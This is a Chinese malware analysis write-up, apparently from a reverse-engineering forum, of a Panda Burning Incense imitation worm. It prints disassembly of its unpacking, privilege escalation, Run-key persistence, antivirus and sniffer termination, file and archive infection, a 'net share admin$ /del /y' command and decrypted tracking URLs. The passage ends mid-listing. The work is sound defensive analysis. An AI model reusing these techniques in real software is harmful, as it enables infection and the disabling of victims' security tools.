
# 山寨熊猫烧香病毒分析

> 原文：[`www.pediy.com/kssd/pediy10/88974.html`](https://www.pediy.com/kssd/pediy10/88974.html)

- 【文章标题】: 山寨熊猫烧香病毒分析
- 【文章作者】: dttom
- 【作者邮箱】: dttom2006@gmail.com
- 【作者主页】: [`hi.baidu.com/dttom`](http://hi.baidu.com/dttom)
- 【软件名称】: `cool_gamesetup.exe`
- 【下载地址】: 自己搜索下载
- 【加壳方式】: 两层壳
- 【编写语言】: `Delphi`
- 【使用工具】: `OllyICE`、`IDA`、`VMWARE`
- 【操作平台】: `WINXP SP3`
- 【作者声明】: 只是感兴趣，没有其他目的。失误之处敬请诸位大侠赐教!

## 详细过程

这个病毒在我们单位的局域网泛滥，找到一个样本后，分析了一下。病毒伪装成 `nod32` 杀毒软件图标。

### 1. 脱壳，病毒加了两层壳

#### 第一层 `NsPacK V3.1` -> `LiuXingPing`

引用:
```
0044D82F >  9C            pushfd
0044D830    60            pushad
0044D831    E8 00000000   call    0044D836
0044D836    5D            pop     ebp
0044D837    83ED 07       sub     ebp, 7
0044D83A    8D9D 71FCFFFF lea     ebx, dword ptr [ebp-38F]
0044D840    8A03          mov     al, byte ptr [ebx]
0044D842    3C 00         cmp     al, 0
0044D844    74 10         je      short 0044D856
......
004115C1    90            nop
004115C2    8B2C08        mov     ebp, dword ptr [eax+ecx]
004115C5    2C 08         sub     al, 8
004115C7    8B45 45       mov     eax, dword ptr [ebp+45]
004115CA    90            nop
004115CB    8B45 45       mov     eax, dword ptr [ebp+45]
004115CE    90            nop
004115CF    8B45 45       mov     eax, dword ptr [ebp+45]
004115D2    90            nop
004115D3    8B45 45       mov     eax, dword ptr [ebp+45]
004115D6    90            nop
004115D7    90            nop
004115D8    8B45 45       mov     eax, dword ptr [ebp+45]
004115DB  ^ E9 20FAFEFF   jmp     00401000
```

#### 第二层 `PECompact V2.X` -> `Bitsum Technologies`

引用:
```
00401000    B8 B8A34400   mov     eax, 0044A3B8
00401005    50            push    eax
00401006    64:FF35 0000000>push   dword ptr fs:[0]
0040100D    64:8925 0000000>mov    dword ptr fs:[0], esp
00401014    33C0          xor     eax, eax
00401016    8908          mov     dword ptr [eax], ecx
00401018    50            push    eax
00401019    45            inc     ebp
0040101A    43            inc     ebx
0040101B    6F            outs    dx, dword ptr es:[edi]
0040101C    6D            ins     dword ptr es:[edi], dx
```

`bp VirtualFree` 两次后，向下找到:
```
.....
00980B2B    8B46 0C       mov     eax, dword ptr [esi+C]
00980B2E    03C7          add     eax, edi
00980B30    5D            pop     ebp
00980B31    5E            pop     esi
00980B32    5F            pop     edi
00980B33    5B            pop     ebx
00980B34    C3            retn          ;返回到 0044A458 (Cool_Gam.0044A458)
......
0044A456    FFD7          call    edi
0044A458    8985 3F130010 mov     dword ptr [ebp+1000133F], eax    ; Cool_Gam.00429104
0044A45E    8BF0          mov     esi, eax
0044A460    8B4B 14       mov     ecx, dword ptr [ebx+14]
0044A463    5A            pop     edx
0044A464    EB 0C         jmp     short 0044A472
0044A466    03CA          add     ecx, edx
0044A468    68 00800000   push    8000
0044A46D    6A 00         push    0
0044A46F    57            push    edi
0044A470    FF11          call    dword ptr [ecx]
0044A472    8BC6          mov     eax, esi
0044A474    5A            pop     edx
0044A475    5E            pop     esi
0044A476    5F            pop     edi
0044A477    59            pop     ecx
0044A478    5B            pop     ebx
0044A479    5D            pop     ebp
0044A47A    FFE0          jmp     eax        ;跳到程序入口
```

`dump` 内存得到程序，为 `peid` 查壳为 `Borland Delphi 6.0 - 7.0` 开发。

### 2. 程序行为

#### 2.1 通过 `GetProcAddress` 获取系统相关函数的地址

1. 首先调用网络共享函数地址，用非法调用

引用:
```
00428920  /$  53           push    ebx
00428921  |.  68 60894200  push    00428960            ; /FileName = "netapi32.dll"
00428926  |.  E8 65E4FDFF  call    <jmp.&kernel32.LoadLibraryA>     ; \LoadLibraryA
0042892B  |.  8BD8         mov     ebx, eax
0042892D  |.  68 70894200  push    00428970            ; /netshareenum
00428932  |.  53           push    ebx                 ; |hModule
00428933  |.  E8 E0E3FDFF  call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress
00428938  |.  A3 703A4300  mov     dword ptr [433A70], eax
0042893D  |.  68 80894200  push    00428980            ; /netapibufferfree
00428942  |.  53           push    ebx                 ; |hModule
00428943  |.  E8 D0E3FDFF  call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress
00428948  |.  A3 683A4300  mov     dword ptr [433A68], eax
0042894D  |.  68 70894200  push    00428970            ; /netshareenum
00428952  |.  53           push    ebx                 ; |hModule
00428953  |.  E8 C0E3FDFF  call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress
00428958  |.  A3 6C3A4300  mov     dword ptr [433A6C], eax
0042895D  |.  5B           pop     ebx
0042895E  \.  C3           retn
```

2. 系统提权，用于执行网络共享枚举等函数

引用:
```
0040750C  /$  53           push    ebx                 ;  TXPlatf0.00433A8C
0040750D  |.  83C4 D0      add     esp, -30
00407510  |.  8D4424 04    lea     eax, dword ptr [esp+4]
00407514  |.  50           push    eax                 ; /phToken
00407515  |.  6A 20        push    20                  ; |DesiredAccess = TOKEN_ADJUST_PRIVILEGES
00407517  |.  E8 9CF7FFFF  call    <jmp.&kernel32.GetCurrentProcess>; |GetCurrentProcess
0040751C  |.  50           push    eax                 ; |hProcess
0040751D  |.  E8 9EF6FFFF  call    <jmp.&ADVAPI32.OpenProcessToken>  ; \OpenProcessToken
00407522  |.  8D4424 08    lea     eax, dword ptr [esp+8]
00407526  |.  50           push    eax                 ; /pLocalId
00407527  |.  68 A8754000  push    004075A8            ; |sedebugprivilege
0040752C  |.  6A 00        push    0                   ; |SystemName = NULL
0040752E  |.  E8 85F6FFFF  call    <jmp.&ADVAPI32.LookupPrivilegeVa>; \LookupPrivilegeValueA
00407533  |.  8B4424 08    mov     eax, dword ptr [esp+8]
00407537  |.  894424 24    mov     dword ptr [esp+24], eax
0040753B  |.  8B4424 0C    mov     eax, dword ptr [esp+C]
0040753F  |.  894424 28    mov     dword ptr [esp+28], eax
00407543  |.  C74424 20 010>mov    dword ptr [esp+20], 1
0040754B  |.  33DB         xor     ebx, ebx
0040754D  |.  895C24 2C    mov     dword ptr [esp+2C], ebx
00407551  |.  54           push    esp                 ; /pRetLen
00407552  |.  8D4424 14    lea     eax, dword ptr [esp+14]         ; |
00407556  |.  50           push    eax                 ; |pPrevState
00407557  |.  6A 10        push    10                  ; |PrevStateSize = 10 (16.)
00407559  |.  8D4424 2C    lea     eax, dword ptr [esp+2C]         ; |
0040755D  |.  50           push    eax                 ; |pNewState
0040755E  |.  6A 00        push    0                   ; |DisableAllPrivileges = FALSE
00407560  |.  8B4424 18    mov     eax, dword ptr [esp+18]         ; |
00407564  |.  50           push    eax                 ; |hToken
00407565  |.  E8 46F6FFFF  call    <jmp.&ADVAPI32.AdjustTokenPrivil>; \AdjustTokenPrivileges
0040756A  |.  8B4424 08    mov     eax, dword ptr [esp+8]
```



### 1. 获取 `AdjustTokenPrivileges` 地址并调用

```
  0040756E  |.  894424 14     mov     dword ptr [esp+14], eax  
  00407572  |.  8B4424 0C     mov     eax, dword ptr [esp+C]  
  00407576  |.  894424 18     mov     dword ptr [esp+18], eax  
  0040757A  |.  C74424 10 010>mov     dword ptr [esp+10], 1  
  00407582  |.  83CB 02       or      ebx, 2  
  00407585  |.  895C24 1C     mov     dword ptr [esp+1C], ebx  
  00407589  |.  54            push    esp                      ; /pRetLen  
  0040758A  |.  6A 00         push    0                        ; |pPrevState = NULL  
  0040758C  |.  8B4424 08     mov     eax, dword ptr [esp+8]     ; |  
  00407590  |.  50            push    eax                      ; |PrevStateSize  
  00407591  |.  8D4424 1C     lea     eax, dword ptr [esp+1C]    ; |  
  00407595  |.  50            push    eax                      ; |pNewState  
  00407596  |.  6A 00         push    0                        ; |DisableAllPrivileges = FALSE  
  00407598  |.  8B4424 18     mov     eax, dword ptr [esp+18]    ; |  
  0040759C  |.  50            push    eax                      ; |hToken  
  0040759D  |.  E8 0EF6FFFF   call    <jmp.&ADVAPI32.AdjustTokenPrivil>; \AdjustTokenPrivileges  
  004075A2  |.  83C4 30       add     esp, 30  
  004075A5  |.  5B            pop     ebx  
  004075A6  \.  C3            retn  
```

### 3) 获取进程相关的一些函数地址

引用:

```
  0040705C  /$  53            push    ebx                      ;  (initial cpu selection)  
  0040705D  |.  BB 80364300   mov     ebx, 00433680  
  00407062  |.  833B 00       cmp     dword ptr [ebx], 0  
  00407065  |.  0F85 35010000 jnz     004071A0  
  0040706B  |.  68 B8714000   push    004071B8                 ; /kernel32.dll  
  00407070  |.  E8 9BFCFFFF   call    <jmp.&kernel32.GetModuleHandleA> ; \GetModuleHandleA  
  00407075  |.  8903          mov     dword ptr [ebx], eax  
  00407077  |.  833B 00       cmp     dword ptr [ebx], 0  
  0040707A  |.  0F84 20010000 je      004071A0  
  00407080  |.  68 C8714000   push    004071C8                 ; /createtoolhelp32snapshot  
  00407085  |.  8B03          mov     eax, dword ptr [ebx]     ; |  
  00407087  |.  50            push    eax                      ; |hModule  
  00407088  |.  E8 8BFCFFFF   call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  0040708D  |.  A3 84364300   mov     dword ptr [433684], eax  
  00407092  |.  68 E4714000   push    004071E4                 ; /heap32listfirst  
  00407097  |.  8B03          mov     eax, dword ptr [ebx]     ; |  
  00407099  |.  50            push    eax                      ; |hModule  
  0040709A  |.  E8 79FCFFFF   call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  0040709F  |.  A3 88364300   mov     dword ptr [433688], eax  
  004070A4  |.  68 F4714000   push    004071F4                 ; /heap32listnext  
  004070A9  |.  8B03          mov     eax, dword ptr [ebx]     ; |  
  004070AB  |.  50            push    eax                      ; |hModule  
  004070AC  |.  E8 67FCFFFF   call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  004070B1  |.  A3 8C364300   mov     dword ptr [43368C], eax  
  004070B6  |.  68 04724000   push    00407204                 ; /heap32first  
  004070BB  |.  8B03          mov     eax, dword ptr [ebx]     ; |  
  004070BD  |.  50            push    eax                      ; |hModule  
  004070BE  |.  E8 55FCFFFF   call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  004070C3  |.  A3 90364300   mov     dword ptr [433690], eax  
  004070C8  |.  68 10724000   push    00407210                 ; /heap32next  
  004070CD  |.  8B03          mov     eax, dword ptr [ebx]     ; |  
  004070CF  |.  50            push    eax                      ; |hModule  
  004070D0  |.  E8 43FCFFFF   call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  004070D5  |.  A3 94364300   mov     dword ptr [433694], eax  
  004070DA  |.  68 1C724000   push    0040721C                 ; /toolhelp32readprocessmemory  
  004070DF  |.  8B03          mov     eax, dword ptr [ebx]     ; |  
  004070E1  |.  50            push    eax                      ; |hModule  
  004070E2  |.  E8 31FCFFFF   call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  004070E7  |.  A3 98364300   mov     dword ptr [433698], eax  
  004070EC  |.  68 38724000   push    00407238                 ; /process32first  
  004070F1  |.  8B03          mov     eax, dword ptr [ebx]     ; |  
  004070F3  |.  50            push    eax                      ; |hModule  
  004070F4  |.  E8 1FFCFFFF   call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  004070F9  |.  A3 9C364300   mov     dword ptr [43369C], eax  
  004070FE  |.  68 48724000   push    00407248                 ; /process32next  
  00407103  |.  8B03          mov     eax, dword ptr [ebx]     ; |  
  00407105  |.  50            push    eax                      ; |hModule  
  00407106  |.  E8 0DFCFFFF   call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  0040710B  |.  A3 A0364300   mov     dword ptr [4336A0], eax  
  00407110  |.  68 58724000   push    00407258                 ; /process32firstw  
  00407115  |.  8B03          mov     eax, dword ptr [ebx]     ; |  
  00407117  |.  50            push    eax                      ; |hModule  
  00407118  |.  E8 FBFBFFFF   call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  0040711D  |.  A3 A4364300   mov     dword ptr [4336A4], eax  
  00407122  |.  68 68724000   push    00407268                 ; /process32nextw  
  00407127  |.  8B03          mov     eax, dword ptr [ebx]     ; |  
  00407129  |.  50            push    eax                      ; |hModule  
  0040712A  |.  E8 E9FBFFFF   call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  0040712F  |.  A3 A8364300   mov     dword ptr [4336A8], eax  
  00407134  |.  68 78724000   push    00407278                 ; /thread32first  
  00407139  |.  8B03          mov     eax, dword ptr [ebx]     ; |  
  0040713B  |.  50            push    eax                      ; |hModule  
  0040713C  |.  E8 D7FBFFFF   call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  00407141  |.  A3 AC364300   mov     dword ptr [4336AC], eax  
  00407146  |.  68 88724000   push    00407288                 ; /thread32next  
  0040714B  |.  8B03          mov     eax, dword ptr [ebx]     ; |  
  0040714D  |.  50            push    eax                      ; |hModule  
  0040714E  |.  E8 C5FBFFFF   call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  00407153  |.  A3 B0364300   mov     dword ptr [4336B0], eax  
  00407158  |.  68 98724000   push    00407298                 ; /module32first  
  0040715D  |.  8B03          mov     eax, dword ptr [ebx]     ; |  
  0040715F  |.  50            push    eax                      ; |hModule  
  00407160  |.  E8 B3FBFFFF   call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  00407165  |.  A3 B4364300   mov     dword ptr [4336B4], eax  
  0040716A  |.  68 A8724000   push    004072A8                 ; /module32next  
  0040716F  |.  8B03          mov     eax, dword ptr [ebx]     ; |  
  00407171  |.  50            push    eax                      ; |hModule  
  00407172  |.  E8 A1FBFFFF   call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  00407177  |.  A3 B8364300   mov     dword ptr [4336B8], eax  
  0040717C  |.  68 B8724000   push    004072B8                 ; /module32firstw  
```



```text
  00407181  |.  8B03            mov     eax, dword ptr [ebx]             ; |  
  00407183  |.  50             push    eax                              ; |hModule  
  00407184  |.  E8 8FFBFFFF    call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  00407189  |.  A3 BC364300    mov     dword ptr [4336BC], eax  
  0040718E  |.  68 C8724000    push    004072C8                         ; /module32nextw  
  00407193  |.  8B03           mov     eax, dword ptr [ebx]             ; |  
  00407195  |.  50            push    eax                              ; |hModule  
  00407196  |.  E8 7DFBFFFF    call    <jmp.&kernel32.GetProcAddress>   ; \GetProcAddress  
  0040719B  |.  A3 C0364300    mov     dword ptr [4336C0], eax  
  004071A0  |>  833B 00        cmp     dword ptr [ebx], 0  
  004071A3  |.  74 09          je      short 004071AE  
  004071A5  |.  833D 84364300> cmp     dword ptr [433684], 0  
  004071AC  |.  75 04          jnz     short 004071B2  
  004071AE  |>  33C0           xor     eax, eax  
  004071B0  |.  5B            pop     ebx  
  004071B1  |.  C3            retn  
  004071B2  |>  B0 01         mov     al, 1  
  004071B4  |.  5B            pop     ebx  
  004071B5  \.  C3            retn  
```

### 2.2 删除 `C:\WINDOWS\system32\drivers\etc\hosts` 文件，在`"C:\WINDOWS\system32\drivers\"`创建`"TXPlatf0rmm.exe"`并从 `cool_gamesetup.exe` 复制数据（病毒自身）写入`"C:\WINDOWS\system32\drivers\TXPlatf0rmm.exe"`文件。接着就是写入注册启动项，使“我的电脑->工具->文件夹选项->查看”中的“显示所有文件和文件夹功能”失效。以及加入启动项，关闭 `360` 安全卫士等。

引用: ......

```text
  0042713D  |.  50            push    eax  
  0042713E  |.  B9 E8714200   mov     ecx, 004271E8                    ; explorer  
  00427143  |.  BA F4714200   mov     edx, 004271F4                    ; software\microsoft\windows\currentversion\run  
  00427148  |.  B8 01000080   mov     eax, 80000001  
  0042714D  |.  E8 5A03FEFF   call    004074AC  
  00427152  |.  33C9          xor     ecx, ecx  
  00427154  |.  BA 2C724200   mov     edx, 0042722C                    
  00427159  |.  B8 02000080   mov     eax, 80000002  
  0042715E  |.  E8 39F7FEFF   call    0041689C  
  00427163  |.  B8 94724200   mov     eax, 00427294                    ; 360tray.exe  
  00427168  |.  E8 8307FEFF   call    004078F0  
  0042716D  |.  84C0          test    al, al  
  0042716F  |.  75 0E         jnz     short 0042717F  
  00427171  |.  B8 A8724200   mov     eax, 004272A8                    ; safeboxtray.exe  
  00427176  |.  E8 7507FEFF   call    004078F0  
  0042717B  |.  84C0          test    al, al  
  0042717D  |.  74 16         je      short 00427195  
  .......  
```

### 2.3 病毒会对文件进行过滤，排除一些文件和文件夹不感染。“ntdetect.com，windows\winrar\winnt\system32\documents and settings\system volume\information\recycled\windows nt\windowsupdate\windows media\player\outlook express\internet explorer\netmeeting\common files complus applications\common files\messenger\installshield installation information\msn\microsoft frontpage\movie maker\msn gamin zone”

### 2.4 设置定时器，用于执行感染写入,病毒最可恶的是会将硬盘上备份在`.rar` 文件包的文件解压到`"c:\myrarwork"`昨时文件夹，感染后再压缩回去!!!感染后缀名为 `exe\scr\pif\com\htm\html\asp\php\jsp\aspx` 的文件。`exe` 文件被感染后，无法运行,可能是病毒的 bug。病毒会在感染的文件夹下写入 `desktop_1.ini`、`desktop_2.ini`,病毒的时间标志。

### 2.4 病毒运行后会运行调用 `cmd.exe /c net share admin$ /del /y` 等命令删除默认共享。

### 2.5 实现网络连接，病毒对自身的字符串进行了加密解密后网址为`"http://www.ipshougou.com/tj.htm"`大概是统计中马机器数量（我猜?）

下载`"http://www.ipshougou.com/goto/down.t....com/stat.php?id=1212193&web_id=1212193"` 这个大概是个网站排名之类的东西，获取点击数。

病毒对字符串进行了简单的 `xor` 加密，解密函数如下：

引用: ......

```text
  00407759  |> /8B45 EC       /mov     eax, dword ptr [ebp-14]       ; 加解密用密钥“true”的地址移入 EAX  
  0040775C  |. |E8 63D5FFFF   |call    00404CC4                     ; 检测密钥是否存在  
  00407761  |. |50            |push    eax                            ; 密钥长度 4 入栈  
  00407762  |. |8BC3          |mov     eax, ebx  
  00407764  |. |5A            |pop     edx                            ; 弹入 edx  
  00407765  |. |8BCA          |mov     ecx, edx  
  00407767  |. |99            |cdq                                    ; 将 EAX 中的字的符号扩展到 EDX 中  
  00407768  |. |F7F9          |idiv    ecx                            ; 整数除法  
  0040776A  >|. |8BFA         |mov     edi, edx                       ; 余数移入 EDI，用作定位密钥数组  
  0040776C  |. |47            |inc     edi  
  0040776D  |. |8B45 EC       |mov     eax, dword ptr [ebp-14]       ; 加解密用密钥“true”的地址移入 EAX  
  00407770  |. |0FB64438 FF   |movzx   eax, byte ptr [eax+edi-1]     ; 取具体密钥字符  
  00407775  |. |B9 0A000000   |mov     ecx, 0A                        ; 固定除数 10  
  0040777A  |. |33D2          |xor     edx, edx  
  0040777C  |. |F7F1          |div     ecx                            ; 无符号除法，余数放入 EDX  
  0040777E  |. |8B45 FC       |mov     eax, dword ptr [ebp-4]        ; 解密数据地址  
  00407781  |. |0FB64418 FF   |movzx   eax, byte ptr [eax+ebx-1]     ; 解密字节入 EAX  
  00407786  |. |33D0          |xor     edx, eax                       ; 按位异或解密  
  00407788  |. |8D45 E8       |lea     eax, dword ptr [ebp-18]  
  0040778B  |. |E8 80D4FFFF   |call    00404C10  
  00407790  |. |8B55 E8       |mov     edx, dword ptr [ebp-18]  
  00407793  |. |8D45 F0       |lea     eax, dword ptr [ebp-10]  
  00407796  |. |E8 31D5FFFF   |call    00404CCC  
  0040779B  |. |43            |inc     ebx  
  0040779C  |. |4E            |dec     esi  
  0040779D  |.\75 BA         \jnz     short 00407759  
  ......  
```

加密数据如下，通过分析，可知数据结构如下：

```c
Struct EncodeData(
     DWORD  sign;
     DWORD  charLength;
     char   str[];
 )
```

```text
  .nsp0:00416668  FF FF FF FF 04 00 00 00  dd 0FFFFFFFFh, 4  
  .nsp0:00416670  74 72 75 65 00           aTrue_2 db 'true',0                 ; DATA XREF: sub_4165F0+18o  
  .nsp0:00416670                                                      ; sub_4165F0+3Bo  
  .nsp0:00416675  00 00 00                 align 4  
  .nsp0:00416678  FF FF FF FF 1F 00 00 00  dd 0FFFFFFFFh, 1Fh  
  .nsp0:00416680  6C 73 75 76 3E 28 2E 75+aLsuv_qspOtti_0 db 'lsuv>(.qsp/ottiiq`ns*dnk+sk(lsl',0  
  .nsp0:00416680  73 70 2F 6F 74 74 69 69+                          ; DATA XREF: sub_4165F0+1Do  
  .nsp0:004166A0  FF FF FF FF 36 00 00 00  dd 0FFFFFFFFh, 36h  
  .nsp0:004166A8  6C 73 75 76 3E 28 2E 75+aLsuv_u04EjGhlW db 'lsuv>(.u04/ej}{(ghl)ws`r*wiv;ne;55045>2 sbcYmc<76637=4',0  
  .nsp0:004166A8  30 34 2F 65 6A 7D 7B 28+                          ; DATA XREF: sub_4165F0+40o  
  .nsp0:004166DF  00                     align 10h  
```

运用 `IDA` 的脚本功能解密结果如下：

```text
  .nsp0:00416668  FF FF FF FF 04 00 00 00  dd 0FFFFFFFFh, 4  
  .nsp0:00416670  74 72 75 65 00           aTrue_2 db 'true',0                 ; DATA XREF: sub_4165F0+18o  
  .nsp0:00416670                                                      ; sub_4165F0+3Bo  
  .nsp0:00416675  00 00 00                 align 4  
  .nsp0:00416678  FF FF FF FF 1F 00 00 00  dd 0FFFFFFFFh, 1Fh  
  .nsp0:00416680  68 74 74 70 3A 2F 2F 77+aLsuv_qspOtti_0 db 'http://www.ipshougou.com/tj.htm',0  
  .nsp0:00416680  77 77 2E 69 70 73 68 6F+                          ; DATA XREF: sub_4165F0+1Do  
  .nsp0:004166A0  FF FF FF FF 36 00 00 00  dd 0FFFFFFFFh, 36h  
  .nsp0:004166A8  68 74 74 70 3A 2F 2F 73+aLsuv_u04EjGhlW db 'http://s43.cnzz.com/stat.php?id=1212193&web_id=1212193',0  
  .nsp0:004166A8  34 33 2E 63 6E 7A 7A 2E+                          ; DATA XREF: sub_4165F0+40o  
  .nsp0:004166DF  00                     align 10h  
```

引用:  解密 `IDC` 如下：

```c
  #include <idc.idc>  
  static decrypt(from,size,key1,key2)  
  {  
     auto  i,x,y,m,n,base;  
     base =0x00416670;  
     for(i=1;i<=size;i=i+1)  
     {  
         y=i%key1;  
         Message("y = %x \n",y);          
         m=Byte(base+y);  
         Message("m = %x \n",m);  
         n=m%key2;  
         Message("n = %x \n",n);          
         x=Byte(from);
```



```
n=(n^x);

Message("x = %x \\n",x);

PatchByte(from,n);

from=from+1;

}

}
```

### 2.6 枚举所有窗口，关闭一些网络监控、嗅探软件等

```
引用:
  004080EC  /$  53            push    ebx
  004080ED  |.  56            push    esi
  004080EE  |.  8B1D 002B4300 mov     ebx, dword ptr [432B00]      ;  TXPlatf0.004336EC
  004080F4  |.  33F6          xor     esi, esi
  004080F6  |.  8BC3          mov     eax, ebx
  004080F8  |.  E8 2BC9FFFF    call    00404A28
  004080FD  |.  6A 00         push    0                       ; /lParam = 0
  004080FF  |.  68 14804000   push    00408014                ; |Callback = TXPlatf0.00408014
  00408104  |.  E8 57EEFFFF   call    <jmp.&USER32.EnumWindows>  ; \EnumWindows
  00408109  |.  8B13          mov     edx, dword ptr [ebx]
  0040810B  |.  B8 40824000   mov     eax, 00408240            ;  ASCII "Winsock Expert"
  00408110  |.  E8 97CEFFFF   call    00404FAC
  00408115  |.  85C0          test    eax, eax
  00408117  |.  0F85 04010000 jnz     00408221
  0040811D  |.  8B13          mov     edx, dword ptr [ebx]
  0040811F  |.  B8 58824000   mov     eax, 00408258            ;  ASCII "ComnView"
  00408124  |.  E8 83CEFFFF   call    00404FAC
  00408129  |.  85C0          test    eax, eax
  0040812B  |.  0F85 F0000000 jnz     00408221
  00408131  |.  8B13          mov     edx, dword ptr [ebx]
  00408133  |.  B8 6C824000   mov     eax, 0040826C            ;  ASCII "Outpost"
  00408138  |.  E8 6FCEFFFF   call    00404FAC
  0040813D  |.  85C0          test    eax, eax
  0040813F  |.  0F85 DC000000 jnz     00408221
  00408145  |.  8B13          mov     edx, dword ptr [ebx]
  00408147  |.  B8 7C824000   mov     eax, 0040827C            ;  ASCII "MiniSniffer"
  0040814C  |.  E8 5BCEFFFF   call    00404FAC
  00408151  |.  85C0          test    eax, eax
  00408153  |.  0F85 C8000000 jnz     00408221
  00408159  |.  8B13          mov     edx, dword ptr [ebx]
  0040815B  |.  B8 90824000   mov     eax, 00408290            ;  ASCII "SmartSniff"
  00408160  |.  E8 47CEFFFF   call    00404FAC
  00408165  |.  85C0          test    eax, eax
  00408167  |.  0F85 B4000000 jnz     00408221
  0040816D  |.  8B13          mov     edx, dword ptr [ebx]
  0040816F  |.  B8 A4824000   mov     eax, 004082A4            ;  ASCII "Sniffer"
  00408174  |.  E8 33CEFFFF   call    00404FAC
  00408179  |.  85C0          test    eax, eax
  0040817B  |.  0F85 A0000000 jnz     00408221
  00408181  |.  8B13          mov     edx, dword ptr [ebx]
  00408183  |.  B8 B4824000   mov     eax, 004082B4            ;  ASCII "Sniff"
  00408188  |.  E8 1FCEFFFF   call    00404FAC
  0040818D  |.  85C0          test    eax, eax
  0040818F  |.  0F85 8C000000 jnz     00408221
  00408195  |.  8B13          mov     edx, dword ptr [ebx]
  00408197  |.  B8 C4824000   mov     eax, 004082C4            ;  ASCII "CaptureNet"
  0040819C  |.  E8 0BCEFFFF   call    00404FAC
  004081A1  |.  85C0          test    eax, eax
  004081A3  |.  75 7C         jnz     short 00408221
  004081A5  |.  8B13          mov     edx, dword ptr [ebx]
  004081A7  |.  B8 D8824000   mov     eax, 004082D8            ;  ASCII "PeepNet"
  004081AC  |.  E8 FBCDFFFF   call    00404FAC
  004081B1  |.  85C0          test    eax, eax
  004081B3  |.  75 6C         jnz     short 00408221
  004081B5  |.  8B13          mov     edx, dword ptr [ebx]
  004081B7  |.  B8 E8824000   mov     eax, 004082E8            ;  ASCII "spynet"
  004081BC  |.  E8 EBCDFFFF   call    00404FAC
  004081C1  |.  85C0          test    eax, eax
  004081C3  |.  75 5C         jnz     short 00408221
  004081C5  |.  8B13          mov     edx, dword ptr [ebx]
  004081C7  |.  B8 F8824000   mov     eax, 004082F8            ;  ASCII "Dsniff"
  004081CC  |.  E8 DBCDFFFF   call    00404FAC
  004081D1  |.  85C0          test    eax, eax
  004081D3  |.  75 4C         jnz     short 00408221
  004081D5  |.  8B13          mov     edx, dword ptr [ebx]
  004081D7  |.  B8 08834000   mov     eax, 00408308            ; 嗅探
  004081DC  |.  E8 CBCDFFFF   call    00404FAC
  004081E1  |.  85C0          test    eax, eax
  004081E3  |.  75 3C         jnz     short 00408221
  004081E5  |.  8B13          mov     edx, dword ptr [ebx]
  004081E7  |.  B8 18834000   mov     eax, 00408318            ; 下载者监视器
  004081EC  |.  E8 BBCDFFFF   call    00404FAC
  004081F1  |.  85C0          test    eax, eax
  004081F3  |.  75 2C         jnz     short 00408221
  004081F5  |.  8B13          mov     edx, dword ptr [ebx]
  004081F7  |.  B8 30834000   mov     eax, 00408330            ; 下载拦截者
  004081FC  |.  E8 ABCDFFFF   call    00404FAC
  00408201  |.  85C0          test    eax, eax
  00408203  |.  75 1C         jnz     short 00408221
  00408205  |.  8B13          mov     edx, dword ptr [ebx]
  00408207  |.  B8 44834000   mov     eax, 00408344            ; 抓包
  0040820C  |.  E8 9BCDFFFF   call    00404FAC
  00408211  |.  85C0          test    eax, eax
  00408213  |.  75 0C         jnz     short 00408221
  00408215  |.  E8 72FEFFFF   call    0040808C
  0040821A  |.  85C0          test    eax, eax
  0040821C  |.  75 03         jnz     short 00408221
  0040821E  |.  83CE FF       or      esi, FFFFFFFF
  00408221  |>  B8 54834000   mov     eax, 00408354            ;  ASCII "c:\555.tmp"
  00408226  |.  E8 45FAFFFF   call    00407C70
  0040822B  |.  84C0          test    al, al
  0040822D  |.  74 03         je      short 00408232
  0040822F  |.  83CE FF       or      esi, FFFFFFFF
  00408232  |>  8BC6          mov     eax, esi
  00408234  |.  5E            pop     esi
  00408235  |.  5B            pop     ebx
  00408236  \.  C3            retn
```

### 2.7 关闭杀毒软件及服务、删除注册表键值，对付不同杀毒软件运用两种方法一种是关闭服务，另一种是删除服务。

```
引用:
  0041DB5C   .  B8 ECDC4100           mov     eax, 0041DCEC            ;  schedule
  0041DB61   .  E8 CEF9FFFF           call    0041D534                 ;  关闭服务
  0041DB66   .  B8 00DD4100           mov     eax, 0041DD00            ;  sharedaccess
  0041DB6B   .  E8 C4F9FFFF           call    0041D534
  0041DB70   .  B8 18DD4100           mov     eax, 0041DD18            ;  kavsvc
  0041DB75   .  E8 BAF9FFFF           call    0041D534
  0041DB7A   .  B8 28DD4100           mov     eax, 0041DD28            ;  avp
  0041DB7F   .  E8 B0F9FFFF           call    0041D534
  0041DB84   .  B8 2CDD4100           mov     eax, 0041DD2C            ;  avp
  0041DB89   .  E8 2AFAFFFF           call    0041D5B8                 ;  删除服务
  0041DB8E   .  B8 30DD4100           mov     eax, 0041DD30            ;  kavsvc
  0041DB93   .  E8 20FAFFFF           call    0041D5B8
  0041DB98   .  BA 40DD4100           mov     edx, 0041DD40            ;  software\microsoft\windows\currentversion\run\kav
  0041DB9D   .  B8 02000080           mov     eax, 80000002
  0041DBA2   .  E8 558DFFFF           call    004168FC                 ;  删除注册表键
  0041DBA7   .  BA 7CDD4100           mov     edx, 0041DD7C            ;  software\microsoft\windows\currentversion\run\kavpersonal50
  0041DBAC   .  B8 02000080           mov     eax, 80000002
  0041DBB1   .  E8 468DFFFF           call    004168FC
  0041DBB6   .  BA C0DD4100           mov     edx, 0041DDC0            ;  software\microsoft\windows\currentversion\run\avp
  0041DBBB   .  B8 02000080           mov     eax, 80000002
  0041DBC0   .  E8 378DFFFF           call    004168FC
```



```
0041DBC5   .  B8 FCDD4100               mov     eax, 0041DDFC                ; mcafeeframework
